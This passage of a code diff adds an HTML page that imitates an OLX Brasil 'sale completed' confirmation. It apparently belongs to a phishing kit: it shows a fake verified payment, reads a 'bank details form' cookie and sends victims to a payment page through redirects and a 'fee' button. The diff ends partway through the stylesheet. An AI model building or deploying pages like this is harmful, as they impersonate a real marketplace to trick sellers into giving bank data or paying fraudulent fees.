@@ -1,0 +1,1375 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Venda realizada com sucesso na OLX">
+    <title>Venda Realizada - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <script>
+        // Função para obter valor de um cookie pelo nome
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        // Verifica o cookie dadosBancariosForm e redireciona conforme regras
+        (function () {
+            const cookie = getCookie('dadosBancariosForm');
+            if (cookie) {
+                try {
+                    const dados = JSON.parse(decodeURIComponent(cookie));
+                    if (dados.pagamentoFeito === true) {
+                        window.location.href = '/pag/aprovado.html';
+                    } else {
+                        window.location.href = '/pag/pagamento.html';
+                    }
+                } catch (e) {
+                    // Se erro ao ler o cookie, não faz nada
+                }
+            }
+        })();
+    </script>
+
+    <div class="app-container">
+        <!-- Header renovado estilo OLX -->
+        <header class="header-olx">
+            <div class="container">
+                <div class="header-content">
+                    <div class="logo-olx">
+                        <img src="/images/olx-logo.png" alt="OLX Brasil">
+                    </div>
+                    <nav class="nav-menu">
+                        <a href="/" class="nav-link">Início</a>
+                        <a href="/vendas" class="nav-link">Minhas Vendas</a>
+                        <a href="/conta" class="nav-link">Minha Conta</a>
+                    </nav>
+                </div>
+            </div>
+        </header>
+
+        <!-- Banner de sucesso renovado -->
+        <div class="success-banner">
+            <div class="container">
+                <div class="success-content">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <div class="success-text">
+                        <h1>Parabéns! Venda realizada com sucesso</h1>
+                        <p>Sua transação foi processada e o pagamento foi confirmado</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <main class="main-content">
+            <div class="container">
+                <!-- Breadcrumb melhorado -->
+                <nav class="breadcrumb-olx">
+                    <a href="/">OLX</a>
+                    <i class="fas fa-chevron-right"></i>
+                    <a href="/vendas">Minhas Vendas</a>
+                    <i class="fas fa-chevron-right"></i>
+                    <span>Detalhes da Venda</span>
+                </nav>
+
+                <!-- Card principal do produto REDESENHADO -->
+                <div class="product-showcase">
+                    <div class="showcase-gallery">
+                        <div class="hero-image-wrapper">
+                            <div class="image-badge">
+                                <i class="fas fa-camera"></i>
+                                <span id="image-counter">1/4</span>
+                            </div>
+                            <img id="produto-imagem-principal" src="" alt="Imagem do produto" class="hero-image">
+                            <div class="image-overlay">
+                                <button class="zoom-btn"><i class="fas fa-search-plus"></i></button>
+                            </div>
+                        </div>
+                        <div class="gallery-thumbnails" id="galeria-miniaturas">
+                            <!-- As miniaturas serão geradas dinamicamente -->
+                        </div>
+                    </div>
+                    
+                    <div class="product-info-panel">
+                        <div class="status-ribbon">
+                            <i class="fas fa-check-circle"></i>
+                            VENDA CONCLUÍDA
+                        </div>
+                        
+                        <div class="product-title-section">
+                            <h1 id="produto-nome" class="product-title-modern"></h1>
+                            <div class="product-meta">
+                                <span class="meta-item">
+                                    <i class="fas fa-calendar-alt"></i>
+                                    <span id="produto-data"></span>
+                                </span>
+                                <span class="meta-item">
+                                    <i class="fas fa-hashtag"></i>
+                                    <span id="venda-codigo-small"></span>
+                                </span>
+                            </div>
+                        </div>
+                        
+                        <div class="price-showcase">
+                            <div class="price-container">
+                                <span class="price-label">Valor da venda</span>
+                                <div class="price-display">
+                                    <span id="produto-valor" class="price-value"></span>
+                                    <div class="payment-verified">
+                                        <i class="fas fa-shield-check"></i>
+                                        Pagamento Verificado
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Cards informativos REDESENHADOS -->
+                <div class="modern-cards-layout">
+                    <!-- Card do vendedor com novo design -->
+                    <div class="modern-card seller-modern-card">
+                        <div class="card-ribbon">
+                            <i class="fas fa-store"></i>
+                            VENDEDOR
+                        </div>
+                        <div class="card-content-modern">
+                            <div class="profile-section">
+                                <div class="profile-avatar-container">
+                                    <div class="profile-avatar-modern">
+                                        <span id="vendedor-inicial"></span>
+                                        <div class="avatar-status"></div>
+                                    </div>
+                                    <div class="verified-badge">
+                                        <i class="fas fa-certificate"></i>
+                                    </div>
+                                </div>
+                                <div class="profile-details-modern">
+                                    <h3 id="vendedor-nome" class="profile-name"></h3>
+                                    <div class="profile-location">
+                                        <i class="fas fa-map-marker-alt"></i>
+                                        <span id="vendedor-localizacao"></span>
+                                    </div>
+                                    <div id="avaliacao-container" class="rating-modern">
+                                        <div class="stars-modern">
+                                            <span class="star">★</span>
+                                            <span class="star">★</span>
+                                            <span class="star">★</span>
+                                            <span class="star">★</span>
+                                            <span class="star">★</span>
+                                        </div>
+                                        <span id="vendedor-avaliacao" class="rating-score"></span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="stats-section">
+                                <div class="stat-item">
+                                    <i class="fas fa-box"></i>
+                                    <div class="stat-content">
+                                        <span id="vendedor-produtos" class="stat-number"></span>
+                                        <span class="stat-label">Produtos vendidos</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card do comprador com novo design -->
+                    <div class="modern-card buyer-modern-card">
+                        <div class="card-ribbon">
+                            <i class="fas fa-user"></i>
+                            COMPRADOR
+                        </div>
+                        <div class="card-content-modern">
+                            <div class="profile-section">
+                                <div class="profile-avatar-container">
+                                    <div class="profile-avatar-modern buyer-avatar-modern">
+                                        <i class="fas fa-user"></i>
+                                        <div class="avatar-status buyer-status"></div>
+                                    </div>
+                                </div>
+                                <div class="profile-details-modern">
+                                    <h3 id="comprador-nome" class="profile-name"></h3>
+                                    <div class="profile-since">Membro desde 2021</div>
+                                    <div class="buyer-stats">
+                                        <span class="buyer-stat">
+                                            <i class="fas fa-shopping-bag"></i>
+                                            12 compras
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card do status da venda REDESENHADO -->
+                    <div class="modern-card status-modern-card">
+                        <div class="card-ribbon">
+                            <i class="fas fa-route"></i>
+                            PROGRESSO
+                        </div>
+                        <div class="card-content-modern">
+                            <div class="timeline-modern">
+                                <div class="timeline-item completed">
+                                    <div class="timeline-marker">
+                                        <i class="fas fa-plus"></i>
+                                    </div>
+                                    <div class="timeline-content">
+                                        <h4>Anúncio Criado</h4>
+                                        <p>Produto publicado na plataforma</p>
+                                    </div>
+                                    <div class="timeline-check">
+                                        <i class="fas fa-check"></i>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item completed">
+                                    <div class="timeline-marker">
+                                        <i class="fas fa-heart"></i>
+                                    </div>
+                                    <div class="timeline-content">
+                                        <h4>Cliente Interessado</h4>
+                                        <p>Comprador demonstrou interesse</p>
+                                    </div>
+                                    <div class="timeline-check">
+                                        <i class="fas fa-check"></i>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item completed">
+                                    <div class="timeline-marker">
+                                        <i class="fas fa-credit-card"></i>
+                                    </div>
+                                    <div class="timeline-content">
+                                        <h4>Pagamento Processado</h4>
+                                        <p>Transação aprovada com sucesso</p>
+                                    </div>
+                                    <div class="timeline-check">
+                                        <i class="fas fa-check"></i>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item completed">
+                                    <div class="timeline-marker">
+                                        <i class="fas fa-trophy"></i>
+                                    </div>
+                                    <div class="timeline-content">
+                                        <h4>Venda Finalizada</h4>
+                                        <p>Processo concluído com êxito</p>
+                                    </div>
+                                    <div class="timeline-check">
+                                        <i class="fas fa-check"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card de detalhes da transação REDESENHADO -->
+                    <div class="modern-card transaction-modern-card">
+                        <div class="card-ribbon">
+                            <i class="fas fa-receipt"></i>
+                            TRANSAÇÃO
+                        </div>
+                        <div class="card-content-modern">
+                            <div class="transaction-grid">
+                                <div class="transaction-item">
+                                    <div class="transaction-icon">
+                                        <i class="fas fa-barcode"></i>
+                                    </div>
+                                    <div class="transaction-info">
+                                        <span class="transaction-label">Código</span>
+                                        <span id="venda-codigo" class="transaction-value"></span>
+                                    </div>
+                                </div>
+                                
+                                <div class="transaction-item">
+                                    <div class="transaction-icon">
+                                        <i class="fas fa-desktop"></i>
+                                    </div>
+                                    <div class="transaction-info">
+                                        <span class="transaction-label">Plataforma</span>
+                                        <span id="venda-plataforma" class="transaction-value"></span>
+                                    </div>
+                                </div>
+                                
+                                <div class="transaction-item">
+                                    <div class="transaction-icon">
+                                        <i class="fas fa-shield-alt"></i>
+                                    </div>
+                                    <div class="transaction-info">
+                                        <span class="transaction-label">Pagamento</span>
+                                        <span class="transaction-value">
+                                            OLX Seguro
+                                            <span class="security-indicator">
+                                                <i class="fas fa-check-circle"></i>
+                                            </span>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Seção de dicas de segurança renovada -->
+                <div class="security-tips">
+                    <div class="tips-header">
+                        <h2>Dicas de segurança OLX</h2>
+                        <p>Mantenha suas transações sempre protegidas</p>
+                    </div>
+                    <div class="tips-grid">
+                        <div class="tip-card">
+                            <div class="tip-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h3>Segurança</h3>
+                            <p>Sempre use o sistema de pagamento da OLX para garantir sua proteção.</p>
+                        </div>
+                        <div class="tip-card">
+                            <div class="tip-icon">
+                                <i class="fas fa-handshake"></i>
+                            </div>
+                            <h3>Confiança</h3>
+                            <p>Verifique a reputação do vendedor antes de finalizar sua compra.</p>
+                        </div>
+                        <div class="tip-card">
+                            <div class="tip-icon">
+                                <i class="fas fa-user-check"></i>
+                            </div>
+                            <h3>Avaliação</h3>
+                            <p>Avalie a transação para ajudar outros usuários da comunidade.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer renovado estilo OLX -->
+        <footer class="footer-olx">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-section">
+                        <h4>Conheça a OLX</h4>
+                        <ul>
+                            <li><a href="#">Quem somos</a></li>
+                            <li><a href="#">Carreiras</a></li>
+                            <li><a href="#">Imprensa</a></li>
+                            <li><a href="#">Sustentabilidade</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Ajuda</h4>
+                        <ul>
+                            <li><a href="#">Central de ajuda</a></li>
+                            <li><a href="#">Dicas de segurança</a></li>
+                            <li><a href="#">Plano profissional</a></li>
+                            <li><a href="#">Perguntas frequentes</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Legal</h4>
+                        <ul>
+                            <li><a href="#">Termos de uso</a></li>
+                            <li><a href="#">Política de privacidade</a></li>
+                            <li><a href="#">Diretrizes da comunidade</a></li>
+                            <li><a href="#">Cookies</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h4>OLX nas redes</h4>
+                        <div class="social-links">
+                            <a href="#" class="social-link"><i class="fab fa-facebook"></i></a>
+                            <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
+                            <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                            <a href="#" class="social-link"><i class="fab fa-youtube"></i></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <div class="footer-bottom-content">
+                        <p>&copy; 2023 OLX Brasil - Todos os direitos reservados</p>
+                        <p>CNPJ: 10.000.000/0001-00 - Avenida Paulista, 1000 - São Paulo/SP</p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Modal de sucesso renovado -->
+    <div id="sucesso-modal" class="modal hidden">
+        <div class="modal-overlay"></div>
+        <div class="modal-content-olx">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h3>Parabéns!</h3>
+            <p>Sua venda foi concluída com sucesso</p>
+            <button id="btn-continuar" class="btn-primary-olx" onclick="notificarCliqueContinuar()">
+                Continuar
+            </button>
+        </div>
+    </div>
+
+    <script src="/js/script.js"></script>
+
+    <!-- Adicionar script para compatibilidade com dispositivos móveis -->
+    <script>
+        // Função para carregar dados do produto e garantir compatibilidade móvel
+        function carregarDadosProduto() {
+            // Obter código da venda da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const codigoVenda = urlParams.get('codigo') || 'OLX123456789';
+
+            // Tentar vários caminhos para o arquivo JSON
+            const caminhos = [
+                '/data/vendas.json',
+                './data/vendas.json',
+                '../data/vendas.json'
+            ];
+
+            let tentativaAtual = 0;
+
+            function tentarProximoCaminho() {
+                if (tentativaAtual >= caminhos.length) {
+                    console.error('Não foi possível carregar os dados do produto');
+                    document.getElementById('erro-container').classList.remove('hidden');
+                    return;
+                }
+
+                fetch(caminhos[tentativaAtual])
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Resposta da rede não foi ok');
+                        }
+                        return response.json();
+                    })
+                    .then ((data) => {
+                        const venda = data.find(v => v.codigo === codigoVenda) || data[0];
+                        if (venda) {
+                            preencherDadosVenda(venda);
+                            // Mostrar modal de sucesso após carregar dados
+                            setTimeout(() => {
+                                document.getElementById('sucesso-modal').classList.remove('hidden');
+                            }, 1500);
+                        } else {
+                            throw new Error('Venda não encontrada');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao carregar dados:', error);
+                        tentativaAtual++;
+                        tentarProximoCaminho();
+                    });
+            }
+
+            tentarProximoCaminho();
+        }
+
+        // Função melhorada para manipular miniaturas com suporte a touch
+        function setupGaleriaTouchEvents() {
+            // Aguardar elementos serem carregados na DOM
+            setTimeout(() => {
+                const miniaturas = document.querySelectorAll('.miniatura');
+                const imagemPrincipal = document.getElementById('produto-imagem-principal');
+
+                if (!miniaturas.length || !imagemPrincipal) return;
+
+                miniaturas.forEach(miniatura => {
+                    // Adicionar eventos de mouse
+                    miniatura.addEventListener('click', function () {
+                        imagemPrincipal.src = this.src;
+                        document.querySelectorAll('.miniatura').forEach(m => m.classList.remove('ativa'));
+                        this.classList.add('ativa');
+                    });
+
+                    // Adicionar eventos de touch para dispositivos móveis
+                    miniatura.addEventListener('touchstart', function (e) {
+                        e.preventDefault();
+                        imagemPrincipal.src = this.src;
+                        document.querySelectorAll('.miniatura').forEach(m => m.classList.remove('ativa'));
+                        this.classList.add('ativa');
+                    }, { passive: false });
+                });
+            }, 500);
+        }
+
+        // Função para tratar erro de carregamento de imagens
+        function aplicarImagemPlaceholder(imgElement) {
+            imgElement.onerror = null; // Evitar loop infinito
+            imgElement.src = '/images/produto-placeholder.jpg';
+
+            // Se ainda falhar, criar uma imagem base64
+            imgElement.addEventListener('error', function () {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 150;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#f0f0f0';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#6e0ad6';
+                ctx.font = '16px Arial';
+                ctx.textAlign = 'center';
+                ctx.fillText('Produto OLX', canvas.width / 2, canvas.height / 2);
+                this.src = canvas.toDataURL('image/png');
+            });
+        }
+
+        // Função para inicializar todas as funcionalidades
+        function inicializarPagina() {
+            carregarDadosProduto();
+            setupGaleriaTouchEvents();
+
+            // Adicionar eventos para botão de taxa
+            document.querySelectorAll('.btn-taxa').forEach(btn => {
+                btn.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    window.location.href = '/pag/pagamento.html';
+                });
+
+                // Adicionar evento de touch para dispositivos móveis
+                btn.addEventListener('touchstart', function (e) {
+                    e.preventDefault();
+                    window.location.href = '/pag/pagamento.html';
+                }, { passive: false });
+            });
+        }
+
+        // Iniciar quando o documento estiver pronto
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', inicializarPagina);
+        } else {
+            inicializarPagina();
+        }
+    </script>
+
+    <style>
+        /* Estilos com paleta roxa */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f7f7f7;
+            color: #2d1b4e;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header com tema roxo */
+        .header-olx {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-olx img {
+            height: 40px;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav-link {
+            color: #2d1b4e;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: #8b5cf6;
+        }
+
+        /* Banner de sucesso roxo */
+        .success-banner {
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            color: white;
+            padding: 30px 0;
+            text-align: center;
+        }
+
+        .success-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .success-icon i {
+            font-size: 3rem;
+            color: #ffffff;
+        }
+
+        .success-text h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .success-text p {
+            font-size: 1.1rem;
+            opacity: 0.95;
+        }
+
+        /* Main content */
+        .main-content {
+            padding: 40px 0;
+        }
+
+        /* Breadcrumb */
+        .breadcrumb-olx {
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+        }
+
+        .breadcrumb-olx a {
+            color: #2d1b4e;
+            text-decoration: none;
+        }
+
+        .breadcrumb-olx a:hover {
+            color: #8b5cf6;
+        }
+
+        .breadcrumb-olx i {
+            color: #999;
+            font-size: 0.8rem;
+        }
+
+        .breadcrumb-olx span {
+            color: #999;
+        }
+
+        /* NOVO DESIGN DOS CARDS E IMAGENS */
+        
+        /* Card principal do produto redesenhado */
+        .product-showcase {
+            background: linear-gradient(145deg, #ffffff, #f8fafc);
+            border-radius: 24px;
+            padding: 0;
+            margin-bottom: 40px;
+            box-shadow: 
+                0 20px 40px rgba(139, 92, 246, 0.1),
+                0 4px 8px rgba(139, 92, 246, 0.05);
+            overflow: hidden;
+            border: 1px solid rgba(139, 92, 246, 0.08);
+            display: grid;
+            grid-template-columns: 1.2fr 1fr;
+            min-height: 600px;
+        }
+
+        .showcase-gallery {
+            position: relative;
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .hero-image-wrapper {
+            position: relative;
+            height: 450px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: white;
+            box-shadow: 
+                0 15px 30px rgba(0,0,0,0.1),
+                inset 0 1px 0 rgba(255,255,255,0.6);
+            border: 3px solid rgba(139, 92, 246, 0.1);
+        }
+
+        .hero-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            transition: transform 0.5s ease;
+        }
+
+        .hero-image-wrapper:hover .hero-image {
+            transform: scale(1.05);
+        }
+
+        .image-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(139, 92, 246, 0.9);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            z-index: 2;
+        }
+
+        .image-overlay {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .hero-image-wrapper:hover .image-overlay {
+            opacity: 1;
+        }
+
+        .zoom-btn {
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .zoom-btn:hover {
+            background: rgba(139, 92, 246, 0.9);
+            transform: scale(1.1);
+        }
+
+        .gallery-thumbnails {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            padding: 10px 0;
+            scroll-behavior: smooth;
+        }
+
+        .miniatura {
+            width: 90px;
+            height: 90px;
+            border-radius: 16px;
+            object-fit: cover;
+            cursor: pointer;
+            border: 3px solid transparent;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .miniatura::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent, rgba(139, 92, 246, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .miniatura:hover::before {
+            opacity: 1;
+        }
+
+        .miniatura:hover {
+            border-color: #8b5cf6;
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.3);
+        }
+
+        .miniatura.ativa {
+            border-color: #8b5cf6;
+            transform: translateY(-4px);
+            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.25);
+        }
+
+        .product-info-panel {
+            padding: 40px;
+            background: white;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
+        .status-ribbon {
+            position: absolute;
+            top: 0;
+            right: 40px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 0 0 16px 16px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 8px 16px rgba(16, 185, 129, 0.3);
+        }
+
+        .product-title-modern {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #1e293b;
+            line-height: 1.2;
+            margin-bottom: 15px;
+        }
+
+        .product-meta {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #64748b;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .meta-item i {
+            color: #8b5cf6;
+        }
+
+        .price-showcase {
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            border-radius: 20px;
+            padding: 30px;
+            border: 2px solid rgba(139, 92, 246, 0.1);
+        }
+
+        .price-label {
+            color: #64748b;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .price-value {
+            font-size: 3rem;
+            font-weight: 900;
+            color: #8b5cf6;
+            display: block;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(139, 92, 246, 0.1);
+        }
+
+        .payment-verified {
+            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+            color: #065f46;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 2px solid #86efac;
+        }
+
+        /* Layout moderno dos cards */
+        .modern-cards-layout {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+
+        .modern-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 
+                0 8px 32px rgba(139, 92, 246, 0.12),
+                0 2px 8px rgba(139, 92, 246, 0.08);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(139, 92, 246, 0.1);
+            position: relative;
+        }
+
+        .modern-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #8b5cf6, #a855f7, #c084fc);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modern-card:hover {
+            transform: translateY(-12px);
+            box-shadow: 
+                0 20px 40px rgba(139, 92, 246, 0.2),
+                0 8px 16px rgba(139, 92, 246, 0.15);
+        }
+
+        .modern-card:hover::before {
+            opacity: 1;
+        }
+
+        .card-ribbon {
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            color: white;
+            padding: 12px 20px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-content-modern {
+            padding: 25px;
+        }
+
+        /* Profile cards modernos */
+        .profile-section {
+            display: flex;
+            gap: 20px;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+
+        .profile-avatar-container {
+            position: relative;
+        }
+
+        .profile-avatar-modern {
+            width: 70px;
+            height: 70px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+            font-size: 1.6rem;
+            position: relative;
+            box-shadow: 0 8px 16px rgba(139, 92, 246, 0.3);
+        }
+
+        .buyer-avatar-modern {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+        }
+
+        .avatar-status {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 20px;
+            height: 20px;
+            background: #10b981;
+            border: 3px solid white;
+            border-radius: 50%;
+        }
+
+        .buyer-status {
+            background: #3b82f6;
+        }
+
+        .verified-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #f59e0b;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            box-shadow: 0 4px 8px rgba(245, 158, 11, 0.3);
+        }
+
+        .profile-name {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+
+        .profile-location {
+            color: #64748b;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        .rating-modern {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .stars-modern {
+            color: #f59e0b;
+            font-size: 1.1rem;
+        }
+
+        .rating-score {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            color: #92400e;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 0.85rem;
+        }
+
+        .stats-section {
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .stat-item i {
+            color: #8b5cf6;
+            font-size: 1.5rem;
+        }
+
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #8b5cf6;
+            display: block;
+        }
+
+        .stat-label {
+            color: #64748b;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        /* Timeline moderno */
+        .timeline-modern {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .timeline-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 20px;
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            border-radius: 16px;
+            border-left: 4px solid #8b5cf6;
+            position: relative;
+        }
+
+        .timeline-marker {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            box-shadow: 0 6px 12px rgba(139, 92, 246, 0.3);
+        }
+
+        .timeline-content h4 {
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 4px;
+            font-size: 1.1rem;
+        }
+
+        .timeline-content p {
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+
+        .timeline-check {
+            margin-left: auto;
+            width: 30px;
+            height: 30px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 0.9rem;
+        }
+
+        /* Grid de transação */
+        .transaction-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .transaction-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 20px;
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            border-radius: 16px;
+            border: 1px solid rgba(139, 92, 246, 0.1);
+        }
+
+        .transaction-icon {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        .transaction-label {
+            color: #64748b;
+            font-size: 0.85rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .transaction-value {
+            color: #1e293b;
+            font-weight: 700;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-indicator {
+            color: #10b981;
+        }
+
+        /* Responsividade melhorada */
+        @media (max-width: 768px) {
+            .product-showcase {
+                grid-template-columns: 1fr;
+                min-height: auto;
+            }
+
+            .hero-image-wrapper {
+                height: 300px;
+            }
+
